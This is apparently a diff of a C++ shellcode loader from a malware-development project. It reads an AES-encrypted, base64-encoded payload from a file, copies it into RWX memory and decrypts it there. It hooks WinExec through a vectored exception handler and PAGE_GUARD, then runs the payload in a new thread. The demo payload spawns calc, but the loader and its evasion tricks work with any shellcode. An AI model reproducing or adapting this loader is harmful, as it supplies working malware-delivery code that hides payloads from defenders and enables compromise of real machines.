@@ -62,7 +62,7 @@ LONG WINAPI handler(struct _EXCEPTION_POINTERS* ExceptionInfo) {
         // Checking if the exception occured on calling WinExec
         if (ExceptionInfo->ContextRecord->Rip == DWORD64(WinExec)) {
             printf("[*] Hooking WinExec...\n");
-            
+
             // Redirecting RIP to our custom function
             ExceptionInfo->ContextRecord->Rip = DWORD64(&MyWinExec);
         }
@@ -74,7 +74,7 @@ LONG WINAPI handler(struct _EXCEPTION_POINTERS* ExceptionInfo) {
 int main()
 {
     ifstream infile;
-    infile.open(R"(D:\Maldev\shellcodes\aes_b64_calc1.bin)", std::ios::in | std::ios::binary);
+    infile.open(R"(..\..\aes_b64_calc.bin)", std::ios::in | std::ios::binary);
     infile.seekg(0, std::ios::end);
     size_t file_size_in_byte = infile.tellg();
     shellcode.resize(file_size_in_byte);
@@ -82,27 +82,32 @@ int main()
     infile.read(reinterpret_cast<char*>(shellcode.data()), shellcode.size());
     infile.close();
 
-    
+
 
     leng = shellcode.size();
 
     // Allocate executable memory
     exec_mem = VirtualAlloc(NULL, leng, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
+    printf("[*] Writing shellcode to  %#llx\n", exec_mem);
     // Copy shellcode into allocated memory
     RtlMoveMemory(exec_mem, shellcode.data(), leng);
-
+    
+    printf("[*] Registering VEH...\n");
     // Register Vectored Exception Handler
     AddVectoredExceptionHandler(1, handler);
 
+    printf("[*] Decrypting and decoding shellcode\n");
     // Decrypt & decode shellcode
     aes_decrypt((unsigned char*)exec_mem, leng);
     base64_decode((unsigned char*)exec_mem, &leng);
 
+    printf("[*] Setting up PAGE_GUARD\n");
     // Set up PAGE_GUARD on WinExec
     // WinExec is being called in the shellcode to spawn a calc
     VirtualProtect(WinExec, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
 
+    printf("[+] Running shellcode...\n");
     // Creating a thread with the shellcode and running it
     HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
     WaitForSingleObject(hThread, INFINITE);
